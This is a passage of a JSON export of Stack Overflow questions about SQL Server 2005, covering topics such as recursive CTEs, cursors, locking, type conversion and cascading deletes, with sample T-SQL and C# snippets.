software that we employ is not 64 bit compatible.</p>\n\n<p>I tried downloading a 32 bit driver and changing the DSN but it did not fix my issue.  I still get the exception.</p>\n\n<p>If anyone has any links for 32 bit SQL drivers, or any ideas on how I could fix this by changing the project around, I'm all ears.</p>\n\n<p>Thanks in advance,</p>\n\n<p>-Jrud-</p>\n"},{"tags":["sql-server-2005","locking"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":11551471,"title":"In SQL Server 2005, how can you lock a specific row against both reads and writes?","body":"<p>I know it's probably a little unusual to lock a row against being read from, but it is kind of relevant in this case.  For a row-level lock in SQL Server 2005, how can you lock a row for both reads and writes?  Thanks!</p>\n"},{"tags":["sql-server","sql-server-2005","data-conversion"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":1541,"score":2,"question_id":1559472,"title":"SQL Server converting a variable varchar field to money/decimal/something with decimal places","body":"<p>I'm looking for an elegant way to convert a field of type varchar, with variable data in it, to a data type which can be used for mathematical operations sample data from the field \n(excluding quotes)</p>\n\n<pre><code>''\n'abc'\n'23'\n'23.2'\n</code></pre>\n\n<p>The method should work for all, and for the first &amp; second values should return 0, and not throw an SQL Server error..</p>\n"},{"tags":["mysql","sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":56,"score":2,"question_id":11528593,"title":"SQL Update Query Error","body":"<p>This worked before but now it isn't working and I'm very confused. I reviewed the whole thing and it all looks fine but maybe somebody more advanced can spot something?</p>\n\n<p>Here's the script:</p>\n\n<pre><code>UPDATE Orders SET Orders.OrderStatus = 'Shipped',Orders.SalesRep_CustomerID = null\nWHERE Orders.OrderStatus in ('Pending','Processing') \nAND Orders.PaymentAmount = Orders.Total_Payment_Received\nAND Orders.ShipDate &lt; dateadd(day, -60, convert(char(10), getdate(), 101))\nAND Orders.Shipped = Y\n</code></pre>\n\n<p>All I'm getting is an Error, no explanation. Can somebody spot an error, I'm sure it's obvious I'm just too new to SQL to identify it. Thanks</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":152,"score":2,"question_id":11507602,"title":"FETCH NEXT into table-like structure","body":"<p>All of the examples that I found of <code>FETCH NEXT</code> fetch <code>INTO</code> pre-defined variables.  So:</p>\n\n<pre><code>DECLARE @Whatever Int\nFETCH NEXT FROM my_cursor INTO @Whatever\n</code></pre>\n\n<p>Is there a way to FETCH or otherwise deal with a cursor so that the entire row is accessible (like in a table) without having to define each variable?  So perhaps I can fetch into something other than a scalar?  Or can I query the cursor directly?</p>\n"},{"tags":["sql-server-2005","exception","vb.net-2010","sqlxml","bulk-load"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":85,"score":0,"question_id":11549454,"title":"Using SQLXMLBulkLoad, getting exception because column does not accept NULL values","body":"<p>I am trying to bulk insert XML Data into SQL Server 2005 Express with the SQLXMLBulkLoad Object Model in VB.NET using Visual Studio 2010.</p>\n\n<p>When the loader gets to an element in my .xml file which does not hold a value, it throws an error because the corresponding table column in SQL Server is set to not contain null values. This was by design and instead of inserting NULL I need for the Loader to insert a blank space. I do not know how to go about doing this as this is my first time working with BulkLoad. Any suggestions?</p>\n\n<p>The error.xml file text:</p>\n\n<pre><code>  &lt;?xml version=\"1.0\" ?&gt; \n    &lt;Result State=\"FAILED\"&gt;\n     &lt;Error&gt;\n       &lt;HResult&gt;0x80004005&lt;/HResult&gt; \n       &lt;Description&gt; &lt;![CDATA[ No data was provided for column 'blah' on table 'blah', and this column cannot contain NULL values.]]&gt;&lt;/Description&gt;\n       &lt;Source&gt;General operational error&lt;/Source&gt; \n       &lt;Type&gt;FATAL&lt;/Type&gt; \n     &lt;/Error&gt;\n   &lt;/Result&gt;\n</code></pre>\n\n<p>EDIT:\n<a href=\"http://social.msdn.microsoft.com/Forums/en-US/sqlxml/thread/bfa31c49-6ae5-4a5d-bcde-cd520e0cdf70/\" rel=\"nofollow\">http://social.msdn.microsoft.com/Forums/en-US/sqlxml/thread/bfa31c49-6ae5-4a5d-bcde-cd520e0cdf70/</a></p>\n\n<p>This guy had the exact same problem as I am having, and was able to solve it by using objBl.Transaction = True. However, when I try that, I get an error that \"Cannot bulk load because the file \"This is a Local Temp File\" could not be opened.\"</p>\n"},{"tags":["tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":109,"score":1,"question_id":11563579,"title":"SQL Server CTE to recursively fetch all the linked rows for the given row","body":"<p>I have a table with the following details:  </p>\n\n<pre><code>-- SQL\nCREATE TABLE [dbo].[LedgerTbl](\n    [LedgerID] [int] NOT NULL,\n    [Name] [varchar](50) NOT NULL,\n    [ParentID] [int] NULL,\n    [Cr Amt] [decimal](8, 2) NOT NULL,\n    [Dr Amt] [decimal](8, 2) NOT NULL,\n CONSTRAINT [PK_LedgerTbl] PRIMARY KEY CLUSTERED \n(\n    [LedgerID] ASC\n)WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]\n) ON [PRIMARY]\n\nGO\n-- Data\nINSERT [dbo].[LedgerTbl] ([LedgerID], [Name], [ParentID], [Cr Amt], [Dr Amt]) VALUES (17, N'L1 Ledger', 20, CAST(25252.00 AS Decimal(8, 2)), CAST(0.00 AS Decimal(8, 2)))\nINSERT [dbo].[LedgerTbl] ([LedgerID], [Name], [ParentID], [Cr Amt], [Dr Amt]) VALUES (18, N'L2 Ledger', 20, CAST(9000.00 AS Decimal(8, 2)), CAST(0.00 AS Decimal(8, 2)))\nINSERT [dbo].[LedgerTbl] ([LedgerID], [Name], [ParentID], [Cr Amt], [Dr Amt]) VALUES (20, N'Master Ledger', NULL, CAST(0.00 AS Decimal(8, 2)), CAST(6900.00 AS Decimal(8, 2)))\nINSERT [dbo].[LedgerTbl] ([LedgerID], [Name], [ParentID], [Cr Amt], [Dr Amt]) VALUES (45, N'L1.1 Ledger', 17, CAST(361.00 AS Decimal(8, 2)), CAST(0.00 AS Decimal(8, 2)))\nINSERT [dbo].[LedgerTbl] ([LedgerID], [Name], [ParentID], [Cr Amt], [Dr Amt]) VALUES (46, N'L1.1.1 Ledger', 45, CAST(6541.00 AS Decimal(8, 2)), CAST(0.00 AS Decimal(8, 2)))\nINSERT [dbo].[LedgerTbl] ([LedgerID], [Name], [ParentID], [Cr Amt], [Dr Amt]) VALUES (47, N'L1.1.2 Ledger', 45, CAST(321.00 AS Decimal(8, 2)), CAST(0.00 AS Decimal(8, 2)))\n\nGO\nALTER TABLE [dbo].[LedgerTbl]  WITH CHECK ADD  CONSTRAINT [FK_LedgerTbl_LedgerTbl] FOREIGN KEY([ParentID])\nREFERENCES [dbo].[LedgerTbl] ([LedgerID])\nGO\nALTER TABLE [dbo].[LedgerTbl] CHECK CONSTRAINT [FK_LedgerTbl_LedgerTbl]\nGO\n</code></pre>\n\n<p>The sample data is like this:</p>\n\n<pre><code>LedgerID    Name            ParentID     Cr Amt     Dr Amt\n20          Master Ledger   NULL           0.00    6900.00\n17          L1 Ledger       20         25252.00       0.00\n18          L2 Ledger       20          9000.00       0.00\n45          L1.1 Ledger     17           361.00       0.00\n46          L1.1.1 Ledger   45          6541.00       0.00\n47          L1.1.2 Ledger   45           321.00       0.00 \n</code></pre>\n\n<p>In the above table for the LedgerID 20, I need all the linked ledgers (in all levels), which are directly or indirectly linked for this ledger. In the above table all ledgers are directly linked to 20.<br>\nIf I query for balances of ledger 20 it should show like this (adding all the Cr Amt and Dr Amount of all linked ledgers from all levels):  </p>\n\n<pre><code>Cr Bal        Dr Bal\n41475.00    6900.00\n</code></pre>\n\n<p>Since all the ledgers are directly or indirectly linked to 20, all the Cr Amt and Dr Amt are being summed up.<br>\nThe results should be like this after adding sum of Cr Amt and Dr Amt of all linked/not linked LedgerID's:  </p>\n\n<pre><code>LedgerID   Tot. Cr Amt  Tot Dr Amt\n20         41475.00    6900.00\n18          9000.00       0.00\n17         32475.00       0.00\n45          7223.00       0.00\n46          6541.00       0.00\n47           321.00       0.00\n</code></pre>\n\n<p>Please notice that ledger 18 does not have any child ledgers and hence no need to add any balances.  </p>\n\n<p>Please help to achieve this using CTE or any other method.  Thanks in advance.</p>\n\n<p>This is what I've tried:</p>\n\n<pre><code>;WITH RecursiveLedger(LedgerID, [Name],[Cr Amt], [Dr Amt], LevelNum, LevelIndex, ParentID)\nAS (\n       SELECT lg.LedgerID,\n              lg.[Name],\n              lg.[Cr Amt],\n              lg.[Dr Amt],\n              1 AS LevelNum,\n              CAST(lg.LedgerID AS VARCHAR) AS LevelIndex,\n              lg.ParentID \n       FROM   [LedgerTbl] lg\n       WHERE  lg.ParentID IS NULL\n       UNION ALL\n       SELECT l.LedgerID,\n              l.[Name],\n              l.[Cr Amt],\n              l.[Dr Amt],\n              r.LevelNum + 1 AS LevelNum,\n              CAST(r.LevelIndex + '.' + CAST(ROW_NUMBER() OVER(ORDER BY l.ParentID) AS VARCHAR) AS VARCHAR) AS LevelIndex,\n              l.ParentID \n       FROM   [LedgerTbl] l,\n              RecursiveLedger r\n       WHERE  r.LedgerID = l.ParentID\n   ) SELECT * FROM   RecursiveLedger\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005","oracle","tsql"],"answer_count":2,"favorite_count":0,"up_vote_count":7,"down_vote_count":1,"view_count":7737,"score":6,"question_id":1713127,"title":"Trunc(sysdate) in SQL Server","body":"<p>What is the equivalent of:</p>\n\n<pre><code>TRUNC(SYSDATE)\n</code></pre>\n\n<p>...in SQL Server 2005?</p>\n"},{"tags":["sql","sql-server-2005","sql-server-2008-r2"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":44,"score":-1,"question_id":11558913,"title":"SQL Server 2008 vs. 2005","body":"<p>On my local system there's a SQL Server 2008 installed. But on production there's SQL Server 2005 installed. Can anybody tell me if there are any possible type conversion errors or something similar?</p>\n"},{"tags":["sql-server-2005","db2","resultset","with-statement"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":604,"score":1,"question_id":4952203,"title":"SQL Server/DB2: Same query returns different results?","body":"<h2>Summary</h2>\n\n<p>I'm currently working on a project where I have to query against the underlying database engine for last changes of records that represents users accesses.</p>\n\n<p>Each user may, and is not mandatory to, have children accounts. Children accounts are stored within the same data table with a reference to its parent through the <code>ID_PUSR</code> table field. When the account is a primary, <code>ID_PUSR is null</code></p>\n\n<p>Each time an acces is changed, a new record is then created in the database users table, with a last update date (<code>DT_UPDT</code>).</p>\n\n<hr/>\n\n<h2>Data Sample</h2>\n\n<p>Please consider the following:</p>\n\n<pre><code>create table USERS (\n   ID_USERS INT // Primary key\n    , LN_USER VARCHAR(128)\n    , FN_USER VARCHAR(128)\n    , CD_USER VARCHAR(128)\n    , DT_UPDT DATETIME\n    , ID_PUSR INT // Foreign key to USERS.ID_USERS.\n)\n\nID_USERS CD_USER    LN_USER      FN_USER     DT_UPDT                     ID_PUSR\n\n   808   T_PEI00    LN_USER_00   FN_USER_00  2011-01-01-00.00.00.000000    NULL\n   809   T_PEI00    LN_USER_00   FN_USER_00  2010-01-01-00.00.00.000000    NULL\n   810   T_PEI00    LN_USER_00   FN_USER_00  2009-01-01-00.00.00.000000    NULL\n   811   T_PEI00    LN_USER_00   FN_USER_00  2008-01-01-00.00.00.000000    NULL\n   812   T_PEI00    LN_USER_00   FN_USER_00  2007-01-01-00.00.00.000000    NULL \n   813   T_PEI00A   LN_USER_00   FN_USER_00  2011-01-01-00.00.00.000000    808\n   814   T_PEI00A   LN_USER_00   FN_USER_00  2010-01-01-00.00.00.000000    809\n   815   T_PEI00A   LN_USER_00   FN_USER_00  2009-01-01-00.00.00.000000    810\n   816   T_PEI00A   LN_USER_00   FN_USER_00  2008-01-01-00.00.00.000000    811\n   817   T_PEI00A   LN_USER_00   FN_USER_00  2007-01-01-00.00.00.000000    812\n   818   T_MAW00    LN_USER_01   FN_USER_01  2010-01-01-00.00.00.000000    NULL \n   819   T_MAW00    LN_USER_01   FN_USER_01  2009-01-01-00.00.00.000000    NULL\n   820   T_MAW00    LN_USER_01   FN_USER_01  2008-01-01-00.00.00.000000    NULL\n   821   T_MAW00    LN_USER_01   FN_USER_01  2007-01-01-00.00.00.000000    NULL\n   822   T_VEM08    LN_USER_08   FN_USER_08  2009-01-01-00.00.00.000000    NULL\n   823   T_VEM08    LN_USER_08   FN_USER_08  2008-01-01-00.00.00.000000    NULL\n   824   T_VEM08    LN_USER_08   FN_USER_08  2007-01-01-00.00.00.000000    NULL\n   825   T_LAC99    LN_USER_99   FN_USER_99  2008-01-01-00.00.00.000000    NULL\n   826   T_LAC99    LN_USER_99   FN_USER_99  2007-01-01-00.00.00.000000    NULL\n</code></pre>\n\n<p>I double-checked the data table content within both database servers and I can certify that they are identical records.</p>\n\n<hr/>\n\n<h2>SQL/DB2 Query</h2>\n\n<p>This query is fully compatible with both SQL Server and DB2 database engines:</p>\n\n<pre><code>with UPG as (\n    select ID_USERS\n            , CD_USER\n            , LN_USER\n            , FN_USER\n            , DT_UPDT\n            , ID_PUSR\n            , row_number() over (partition by CD_USER order by CD_USER desc) as ROWNUM\n        from USERS    \n) select ID_USERS\n        , CD_USER\n        , LN_USER\n        , FN_USER\n        , DT_UPDT\n        , ID_PUSR\n        , ROWNUM\n    from UPG\n    where ROWNUM = 1\n    order by CD_USER\n</code></pre>\n\n<hr/>\n\n<h2>Different Results!</h2>\n\n<p>Despite the fact that I'm running the same exact identical query against the above-mentioned RDBMS, I obtain different results as follows:</p>\n\n<h3>IBM DB2</h3>\n\n<pre><code>ID_USERS CD_USER    LN_USER      FN_USER     DT_UPDT                    ID_PUSR  ROWNUM\n\n  826    T_LAC99    LN_USER_99   FN_USER_99  2007-01-01-00.00.00.000000  NULL      1\n  821    T_MAW00    LN_USER_01   FN_USER_01  2007-01-01-00.00.00.000000  NULL      1\n  808    T_PEI00    LN_USER_00   FN_USER_00  2011-01-01-00.00.00.000000  NULL      1\n  814    T_PEI00A   LN_USER_00   FN_USER_00  2010-01-01-00.00.00.000000  809       1\n  822    T_VEM08    LN_USER_08   FN_USER_08  2009-01-01-00.00.00.000000  NULL      1\n</code></pre>\n\n<p>These results appears to be good until we can see the difference between the two database engines. Notice the date values in the <code>DT_UPDT</code> field.</p>\n\n<h3>SQL Server</h3>\n\n<pre><code>ID_USERS CD_USER    LN_USER      FN_USER     DT_UPDT                    ID_PUSR  ROWNUM\n\n  727    T_LAC99    LN_USER_99   FN_USER_99  2008-01-01 00:00:00.000     NULL      1\n  720    T_MAW00    LN_USER_01   FN_USER_01  2010-01-01 00:00:00.000     NULL      1\n  710    T_PEI00    LN_USER_00   FN_USER_00  2011-01-01 00:00:00.000     NULL      1\n  715    T_PEI00A   LN_USER_00   FN_USER_00  2011-01-01 00:00:00.000     710       1\n  724    T_VEM08    LN_USER_08   FN_USER_08  2009-01-01 00:00:00.000     NULL      1\n</code></pre>\n\n<p>These results here in SQL Server are the one with which I shall come in DB2. They represent the \"good\" datum. As for the <code>ID_USERS</code>, they are just ID's, what matters are the dates.</p>\n\n<h2>Questions</h2>\n\n<ol>\n<li>How can the same query returns different results using two SQL ANSI capable engines?</li>\n<li>Is it something with the datum which I don't seem to see?</li>\n<li>How is the <code>WITH...AS ()</code> interpreted by DB2 that shall differ from SQL Server?</li>\n</ol>\n\n<p><em>Nota Benne: A simple <code>select * from USERS order by CD_USER</code> reveals the same data.</em></p>\n"}]}
{"total":14387,"page":14,"pagesize":100,"questions":[{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":3,"view_count":48,"score":-1,"question_id":11549450,"title":"sql server 2005 view the results","body":"<p>I am create a job within a sql server agent. I want to view the result. Not just whether it worked or not but what happened.</p>\n\n<p>For example if my step command was select * from table1. I want to see each row and column of the table. Where is this stored or how do I see the results?</p>\n\n<p>Thanks. </p>\n\n<p>Bob Avallone</p>\n"},{"tags":["sql","sql-server","sql-server-2005","group-by"],"answer_count":2,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":34925,"score":5,"question_id":1208854,"title":"SQL GROUP BY CASE statement with aggregate function","body":"<p>I have a column which looks something like this:</p>\n\n<pre><code>CASE\n    WHEN col1 &gt; col2 THEN SUM(col3*col4)\n    ELSE 0\nEND AS some_product\n</code></pre>\n\n<p>And I would like to put it in my GROUP BY clause, but this seems to cause problems because there is an aggregate function in column.  Is there a way to GROUP BY a column alias such as <code>some_product</code> in this case, or do I need to put this in a subquery and group on that?</p>\n"},{"tags":["sql","sql-server-2005","tsql","reporting-services"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":584,"score":0,"question_id":1361712,"title":"Passing many parameters into SQL and SSRS","body":"<p>i am trying to create a report from a row of data with about 60 columns. The workflow is as follows.</p>\n\n<p>1] user selects the fields they want to view in the report from within c#\n2] c# calls a sp in sql and passes the fields (expecting between 1 and 5 fields per report)\n3] ssrs displays these fields on a pie chart in reporting services.</p>\n\n<p>My questions are, </p>\n\n<p>1] can i pass an array of fields through to sql in one parameter? or do i have to set up 60 parameters to the report and pass them all through even if only a few are required.</p>\n\n<p>2] how can i programatically add only the selected fields to the pie chart and have it created at runtime? my experience has always been you have to build the report prior to deployment.</p>\n\n<p>Thanks!</p>\n"},{"tags":["asp.net","sql-server","sql-server-2005","connection-reset"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":154,"score":0,"question_id":10987372,"title":"SQL Server 2005 Timeout, Connection Was Reset","body":"<p>I am loading 100,000 plus pieces of data, which should take like 30 to 40 minutes to analyze and complete. We use SQL Server 2005.  Currently after a specified time (trying to get the minutes it uses), the SQL Server says the connection was reset.</p>\n\n<p>Is there some setting where this can be changed so my queries can run for an hour?</p>\n"},{"tags":["sql-server","database","sql-server-2005","database-schema"],"answer_count":6,"favorite_count":2,"up_vote_count":8,"down_vote_count":0,"view_count":2499,"score":8,"question_id":5323740,"title":"Difference between database and schema","body":"<p>What's the difference between a Database and a Schema in SQL Server? Both are the containers of tables and data.</p>\n\n<p>If a Schema is deleted, then are all the tables contained in that schema also deleted automatically or they are deleted when the Database is deleted?</p>\n"},{"tags":["sql-server","sql-server-2005","reporting-services"],"answer_count":1,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":455,"score":4,"question_id":694425,"title":"New to SSRS","body":"<p>I am trying to install and configure SSRS on SQL 2005.\nWhen I click \"Reporting Services Configuration\", I get a message saying \"No report servers were found on the specified machine\" - Details Invalid namespace.</p>\n\n<p>How can I resolve this?</p>\n\n<p>Thanks</p>\n"},{"tags":["sql-server","sql-server-2005","null"],"answer_count":5,"favorite_count":2,"up_vote_count":12,"down_vote_count":0,"view_count":6032,"score":12,"question_id":3731172,"title":"How much size \"Null\" value takes in SQL Server","body":"<p>I am having a large table say 10 columns. 4 of them remains null most of the times. I have a query that does null value takes any size or no size in bytes. I read few articles some of them are saying :</p>\n\n<p><a href=\"http://www.sql-server-citation.com/2009/12/common-mistakes-in-sql-server-part-4.html\" rel=\"nofollow\">http://www.sql-server-citation.com/2009/12/common-mistakes-in-sql-server-part-4.html</a>\n<em>\"There is a misconception that if we have the NULL values in a table it doesn't occupy storage space. The fact is, a NULL value occupies space  2 bytes.\"</em></p>\n\n<p><a href=\"http://stackoverflow.com/questions/2116719/sql-using-null-values-vs-default-values\">http://stackoverflow.com/questions/2116719/sql-using-null-values-vs-default-values</a>\nA NULL value in databases is a system value that takes up one byte of storage and indicates that a value is not present as opposed to a space or zero or any other default value.</p>\n\n<p>Can you please guide me regarding the size taken by null value.</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":70,"score":2,"question_id":11545802,"title":"comparing query results from within the same table","body":"<p>RDBMS SQL Server, T-SQL</p>\n\n<p>Consider a table that links information from two different tables: Articles and Categories. This table contains for each Article one or several entries containing the ID of the Categories the Article belongs to. Therefore, a </p>\n\n<pre><code>SELECT * FROM TABLE WHERE ARTICLEID = X \n</code></pre>\n\n<p>returns 1 to n results. </p>\n\n<p>I am looking to build a query which allows me to compare Articles that have the exact same combination of Categories. I've been trying with INTERSECT, but that does not return any rows. An example:</p>\n\n<pre><code>ARTICLEID  CATEGORYID\n\n    1  1\n    1  2\n    1  4\n    2  1\n    2  4\n    3  1\n    3  2\n    3  4\n    4  2\n    4  4\n    5  1\n    5  2\n    5  4\n</code></pre>\n\n<p>The query for <code>ARTICLEID = 1</code> should return 3 and 5, for <code>ARTICLEID = 3</code> should return 1 and 5, et cetera.</p>\n"},{"tags":["sql-server","sql-server-2005","ssis"],"answer_count":9,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":334,"score":2,"question_id":296424,"title":"What are the recommended resources to learn SSIS?","body":"<p>What are some recommended resources/books/blogs on SQL Server Integration Services?</p>\n\n<p>Thanks.</p>\n"},{"tags":["sql","sql-server-2005","cursor","recursive-query"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":152,"score":0,"question_id":11476093,"title":"Inventory Price Calculation in SQL","body":"<p>I'm in SQL 2005 and I'm trying to convert this Cursor into something that isn't a Cursor to determine if this is the most efficient way to do this.</p>\n\n<pre><code>        --Create cursor to determint total cost\nDECLARE CostCursor CURSOR FAST_FORWARD\n        FOR SELECT  ReceiptQty\n                   ,Price\n            FROM    @temp_calculate\n            ORDER BY UpdateDate DESC\nOPEN CostCursor \nFETCH Next FROM CostCursor INTO @ReceiptQty,@Price\nWHILE @@FETCH_STATUS = 0\n      BEGIN\n            IF @OnHandQty &gt;= @ReceiptQty\n               BEGIN\n                           --SELECT @ReceiptQty,@Price, 1,@OnHandQty\n                     SET @Cost = @ReceiptQty * @Price\n                     SET @OnHandQty = @OnHandQty - @ReceiptQty\n                     SET @TotalCost = @TotalCost + @Cost\n               END\n            ELSE\n               BEGIN\n                     IF @OnHandQty &lt; @ReceiptQty\n                        BEGIN\n                              --SELECT @ReceiptQty,@Price, 2,@OnHandQty\n                              SET @Cost = @OnHandQty * @Price\n                              SET @OnHandQty = 0\n                              SET @TotalCost = @TotalCost + @Cost\n                              BREAK;\n                        END\n               END\n            FETCH Next FROM CostCursor INTO @ReceiptQty,@Price\n      END\nCLOSE CostCursor\nDEALLOCATE CostCursor\n</code></pre>\n\n<p>The system needs to go through and use the newest recieved inventory and price to determine what the paid for the on-hand is.</p>\n\n<pre><code>Ex. 1st Iteration: @OnHandQty = 8 RecievedQty = 5 Price = 1 UpdateDate = 1/20 Results:  @HandQty = 3 @TotalCost = $5\n2nd Iteration: @OnHandQty = 3 RecievedQty = 6 Price = 2 UpdateDate = 1/10 Results:  @HandQty = 0 @TotalCost = $11\n</code></pre>\n\n<p>The Final Results tell me that the inventory I have on hand I paid $11 for.  If I was doing this in C# or any other Object Oriented langauge this screams Recursion to me.  I thought about a Recursive CTE could be more efficient.  I've only successfully done any Recursive CTE's for Heirarchy following types of Queries and I haven't been able to successfully wrap my head around a query that would achieve this another way.</p>\n\n<p>Any help or a simple thats how it has to be would be appreciated.</p>\n"},{"tags":["sql","sql-server-2005","average","common-table-expression"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":11549111,"title":"Average of Top 10 & bottom float_value, with date, group by date","body":"<p>I have a table like this:</p>\n\n<pre><code>| prodID  | date     |  perm\n---------------------------------   \n|200      |8/7/2011  | 81.742 \n|200      |8/7/2011  | 81.644\n|200      |8/7/2011  | 81.302\n|200      |8/7/2011  | 81.057\n|201      |8/7/2011  | 80.932\n|201      |8/7/2011  | 80.839\n|201      |8/7/2011  | 80.622\n|201      |8/7/2011  | 80.557\n|201      |8/7/2011  | 80.541\n</code></pre>\n\n<p>(except a bit bigger) \nBreakdown of what happens: I want to take the average of the top 10 values (and bottom 10 values) where a prodid = somevalue in this case 200.</p>\n\n<p>Code:</p>\n\n<pre><code>declare @myid int\nset @myid = 200\n\n;with high as  --top ten average\n(\n select prodid, CONVERT(CHAR(10),  DATEADD(DAY, AVG(DATEDIFF(DAY, 0, CONVERT    \n(SMALLDATETIME, [date]))), 0),     101) as date, max(perm)as max_perm, avg(perm) \nas   \nhigh_perm from   \n( select prodid, date, perm, \n row_number() over(partition by date order by perm desc) as nt    \n from live_pilot_plant\n where prodid = @myid) as T \n where nt &lt;= 10\n group by prodid\n),\nlow as   -- bottom ten average\n(\nselect prodid, CONVERT(CHAR(10),  DATEADD(DAY, AVG(DATEDIFF(DAY, 0, CONVERT    \n(SMALLDATETIME, [date]))), 0),101) as date, min(perm) as min_perm, avg(perm) \nas low_perm  from   \n( select prodid, date, perm,  \n  row_number() over(partition by date order by perm asc) as nt    \n  from live_pilot_plant\n  where prodid = @myid) as T \n  where nt &lt;= 10\n  group by prodid\n)\n\nselect l.prodid, l.date, l.low_perm as low_avg, m.high_perm as high_avg,\n(m.high_perm -    l.low_perm) as delta\nfrom low l\nleft outer join high m\non l.prodid = m.prodid \n</code></pre>\n\n<p>Which produces something like this:</p>\n\n<pre><code>|  prodID  |   date     |  low_avg   |  high_avg  |  delta   |\n|   200    | 08/07/2011 |   68.752   |  79.1976   |  10.444  |\n</code></pre>\n\n<p>THESE NUMBERS ARE NOT ACCURATE --</p>\n\n<p>This is all good and dandy - except not very versitle.  I mean there are a lot of prodID, and to do one this based on prodID is too slow.  How can I get the low_avg and the high_avg based on date (group by prodID) </p>\n\n<p>Something like this:</p>\n\n<pre><code>| date       | prodID  | low_avg  | high_avg  |  delta  |\n| 08/07/2011 | 200     |  60      |  80       |  20     |\n| 08/07/2011 | 201     |  70      |  100      | 100     |\n</code></pre>\n\n<p>NOTE: You might have noticed a crazy convert infront of date.  The reason is that some prodID overlap dates ie. 200 on 8/7/2011, and 8/8/2011, and I need to average the date (which is a varchar). So something like if there were 100 rows with 8/7/2011, and then 9 rows with 8/8/2011, the final query would produce the date being as /8/7/2011</p>\n"},{"tags":["c#","sql","sql-server-2005","cascading-deletes"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":136,"score":2,"question_id":11545722,"title":"SQL DELETE (Cascading DELETE vs. TRIGGERS vs. \"Manual\"-DELETE)","body":"<p>I'm currently working with SQL Server Management Studio 2005 and I'm facing a bit of a problem, but first an extract (the important one) of my DB-schema:</p>\n\n<p><a href=\"http://www.imghack.se/64885\" rel=\"nofollow\">imghack link to the image</a></p>\n\n<p>I want to delete from the <code>test</code> table and everything it is connected to (is composed of).</p>\n\n<p>The problem is, I can't alter the DB anymore (and really wouldn't want to, cause the program using it got too big already).</p>\n\n<p>When I try to delete an entry in the <code>test</code> table and cascading DELETE is turned on for the corresponding foreign key relation the DBMS won't let me do the delete, because it detected some kind of loop (probably caused by the <code>contr_tray</code> table).</p>\n\n<p>When trying to delete an entry manually through my program (using a <code>SqlCommandBuilder</code> or <code>cmd.ExecuteNonQuery())</code> I get this error: </p>\n\n<blockquote>\n  <p>The DELETE statement conflicted with the REFERENCE constraint ...</p>\n</blockquote>\n\n<p>The same happens if I use triggers, to \"cascade\" the deletion process downwards.</p>\n\n<p>Can anyone help me here? Thank you!</p>\n\n<p>P.S.: I also tried to create a joined table where all columns belonging to the <code>subset</code> table would simply be NULL where the <code>contr_tray</code> table had been joined to the replicate table and let the <code>SqlCommandBuilder</code> handle this, but my SQL skills don't seem up to par (i.e. i didn't get the SQL syntax right)[then I could also get the distinct values for all the IDs I would need ...]</p>\n\n<p>Any help would be appreciated and again thanks in advance.</p>\n"},{"tags":["sql-server","sql-server-2008","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":67,"score":1,"question_id":11547600,"title":"Can a not optional parameter follow an optional one in the t-sql stored procedure?","body":"<p>Here's the declaration I'd like to have.</p>\n\n<pre><code>CREATE PROCEDURE UpdateTimeProc  \n(  \n    @Hours int,  \n    @Minutes int,  \n    @Seconds int = 0,  \n    @ResetCounter bit  \n)\n</code></pre>\n"},{"tags":["php","sql-server","sql-server-2005","forum"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":94,"score":-3,"question_id":11542601,"title":"Simple PHP forum with ms sql support","body":"<p>I'm looking for simple php forum, working with MS SQL SERVER 2005, so I could integrate it with my site. PHPBB is not a solution. Maybe there are some ready-made solutions for this? Thanks in advance!</p>\n"},{"tags":["c#","sql","sql-server","sql-server-2005",".net-4.0"],"answer_count":6,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":218,"score":2,"question_id":7891464,"title":"How to perform a count on a arbitrary query (possibly containing a order by)","body":"<p>I have been tasked with updating our internal framework we use in-house. One of the things the framework does is you pass it a query and it will return the number of rows the query has in it (The framework makes heavy use of DataReaders so we need the total before hand for UI things). </p>\n\n<p>The query that the count needs to be done on can be different from project to project (SOL-injection is not a issue, the query is not from user input, just hard coded in from another programmer when they use the framework for their project.) and I was told that just having the programmers write a second query for the count is unacceptable.</p>\n\n<p>Currently the solution is to do the following (I did not write this, I was just told to fix it).</p>\n\n<pre><code>//executes query and returns record count\npublic static int RecordCount(string SqlQuery, string ConnectionString, bool SuppressError = false)\n{\n\n    //SplitLeft is just myString.Substring(0, myString.IndexOf(pattern)) with some error checking. and InStr is just a wrapper for IndexOf.\n    //remove order by clause (breaks count(*))\n    if (Str.InStr(0, SqlQuery.ToLower(), \" order by \") &gt; -1)\n        